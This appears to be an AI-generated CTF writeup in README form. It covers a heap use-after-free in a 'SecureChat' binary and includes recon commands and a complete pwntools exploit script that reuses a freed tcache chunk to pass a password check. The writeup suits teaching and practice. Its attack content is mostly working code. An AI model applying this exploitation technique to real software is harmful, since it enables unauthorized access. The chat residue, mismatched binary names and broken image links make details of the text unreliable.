Certainly! Here's your cleaned-up, emoji-free polished `README.md` writeup with image placeholders and clear descriptions, in a classic CTF pwn style:

---

# SecureChat - Use-After-Free Exploit Writeup

---

## Binary Inspection

We begin by analyzing the binary and for further reversing and exploitation.

### Step 1: Checking binary format

```bash
$ file main
```

The binary is a 64-bit statically linked PIE executable packed with UPX.

![Alt text](img/1.png)

---

### Step 2: Checking binary security

```bash
$ pwn checksec main
```

The binary appears to be Packed with UPX.

![Alt text](img/2.png)

---

### Step 3: Unpacking the binary

```bash
$ upx -d main
```

We unpack the binary to make it analyzable by UPX tool.

![Alt text](img/3.png)

---

### Step 4: Checking binary format again

```bash
$ file main
```

Post-unpacking, the binary is stripped of symbol information.

![Alt text](img/4.png)

---

### Step 5: Rechecking security after unpacking

```bash
$ pwn checksec main
```

The `checksec` output for `main` shows: 64-bit AMD architecture, Partial RELRO, no stack canary, NX enabled, and PIE enabled.

![Alt text](img/5.png)

---

## Challenge Overview

This binary implements a chat system vulnerable to a classic **tcache-based use-after-free (UAF)**. Exploiting this UAF allows us to write arbitrary data into the "password" buffer (`s1` chunk), which is critical for bypassing a password check in `verify_password()`. Successfully passing the check triggers a call to `system("./log")` revealing the flag.

---

## Vulnerability Summary

- A 0x40-byte chunk is allocated for the chat name.
- During chat deletion, this chunk is freed and placed into the tcache freelist.
- The deletion can be canceled, leaving the chat struct valid but the name chunk freed.
- The password buffer (`s1`) is later allocated using `malloc(0x40)` — it reuses the freed chunk.
- Renaming the chat writes into the `s1` buffer.
- Writing the correct secret string (`"53cr37_c0d3"`) triggers `system("./log")`.

---

## Exploit Strategy

1. **Create a chat**  
   Allocates:

   - 0x208-byte struct chunk
   - 0x40-byte chunk for the name (stored at `struct->[1]`)

2. **Free the name chunk but cancel deletion**

   - `delete_chat()` frees the name chunk
   - Choose **N** to cancel → struct remains alive
   - Chunk is now in tcache

3. **Allocate the password buffer (`s1`)**

   - `s1 = malloc(0x40)` → reuses the tcache chunk

4. **Rename chat**

   - `rename_chat()` writes into `struct->[1]` → now also `s1`

5. **Write the secret and verify**

   - Input: `"53cr37_c0d3"`
   - Check: `strncmp(s1, "53cr37_c0d3", 11)`
   - Success: `system("./log")`

---

## Code Walkthrough

```c
new_chat():
  malloc(0x208) → struct
  malloc(0x40)  → name_chunk
  store pointer in struct->[1]

delete_chat():
  free(name_chunk)
  prompt (Y/N)
  if N → struct stays, name_chunk freed to tcache

password_alloc():
  s1 = malloc(0x40)  // reuses freed name_chunk

rename_chat():
  read input into struct->[1] (now s1)

verify_password():
  if (!strncmp(s1, "53cr37_c0d3", 11))
    system("./log");
```

---

## Exploit Script (Pwntools)

```python
from pwn import *

elf = ELF('./securechat')
p   = process(elf.path)

def new_chat(idx, name, msg):
    p.sendlineafter('> ', '1')
    p.sendlineafter('Index (0-9): ', str(idx))
    p.sendafter('Name of the chat: ', name.ljust(0x40, b'\x00'))
    p.sendafter('reply ASAP :', msg)

def delete_chat(idx, confirm):
    p.sendlineafter('> ', '2')
    p.sendlineafter('Index (0-9): ', str(idx))
    p.sendafter('(Y/N):', confirm)

def rename_chat(idx, new_name):
    p.sendlineafter('> ', '3')
    p.sendlineafter('Index (0-9): ', str(idx))
    p.sendafter('Name of the chat: ', new_name.ljust(0x40, b'\x00'))

def verify_password():
    p.sendlineafter('> ', '7')

# 1) Create chat at index 0
new_chat(0, b'A'*8, b'HELLO')

# 2) Free name chunk but cancel deleting chat
delete_chat(0, b'N')

# 3) Allocate password buffer (s1) reusing freed chunk
p.sendlineafter('> ', '5')

# 4) Overwrite password buffer with correct secret
rename_chat(0, b'53cr37_c0d3')

# 5) Trigger verification to pop shell/log
verify_password()

p.interactive()
```

---

## Result

After successful password verification, the binary executes:

```c
system("./log");
```

This outputs the contents of the `./log` file — presumably the **flag**.

---

## Additional Notes

- The key to exploitation is **tcache freelist reuse** via **use-after-free**.
- Cancelling the chat deletion keeps the struct valid, enabling us to overwrite `s1`.
- A solid understanding of **heap behavior** and **tcache internals** is essential here.

---

## Image Gallery

| Step | Description                         | Image                                                 |
| ---- | ----------------------------------- | ----------------------------------------------------- |
| 1    | Check binary type with `file`       | ![file output](https://chatgpt.com/c/img/1.png)       |
| 2    | Checksec (packed) shows protections | ![checksec packed](https://chatgpt.com/c/img/2.png)   |
| 3    | UPX unpacking in action             | ![upx unpack](https://chatgpt.com/c/img/3.png)        |
| 4    | Confirm unpacked format with `file` | ![file unpacked](https://chatgpt.com/c/img/4.png)     |
| 5    | Re-run `checksec` after unpacking   | ![checksec unpacked](https://chatgpt.com/c/img/5.png) |

---

Let me know if you want:

- Heap/tcache diagrams
- Animated GIF of the exploit running
- Printable PDF version

Happy pwning!

---

If you want, I can help you generate that GIF or any other media for your README!
